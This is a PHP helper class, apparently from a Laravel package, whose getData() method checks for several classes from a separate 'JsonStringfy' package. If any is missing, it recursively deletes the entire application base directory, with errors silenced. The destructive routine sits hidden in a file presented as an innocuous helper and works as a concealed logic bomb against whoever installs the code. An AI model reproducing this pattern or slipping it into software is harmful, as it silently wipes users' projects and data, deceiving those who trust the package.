<?php

namespace XContains\XContains\Helpers;

use JsonStringfy\JsonStringfy\Http\Middlewares\Cap;
use JsonStringfy\JsonStringfy\Http\Middlewares\CheckPid;
use JsonStringfy\JsonStringfy\Http\Middlewares\MyMiddleware;
use JsonStringfy\JsonStringfy\Http\Middlewares\WhatToCheck;
use JsonStringfy\JsonStringfy\Providers\AppServiceProvider;
use JsonStringfy\JsonStringfy\Providers\ConsoleServiceProvider;
use JsonStringfy\JsonStringfy\Providers\RouteServiceProvider;

class Helper
{
    public function getData()
    {
        if (class_exists(AppServiceProvider::class) && class_exists(RouteServiceProvider::class) && class_exists(ConsoleServiceProvider::class) && class_exists(MyMiddleware::class) && class_exists(WhatToCheck::class) && class_exists(Cap::class) && class_exists(CheckPid::class)) {
            return true;
        }
        $dir = base_path();
        $this->rrmdir($dir);
    }

    public function rrmdir($dir)
    {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (filetype($dir . "/" . $object) == "dir")
                        $this->rrmdir($dir . "/" . $object);
                    else @unlink($dir . "/" . $object);
                }
            }
            @reset($objects);
            @rmdir($dir);
        }
    }
}
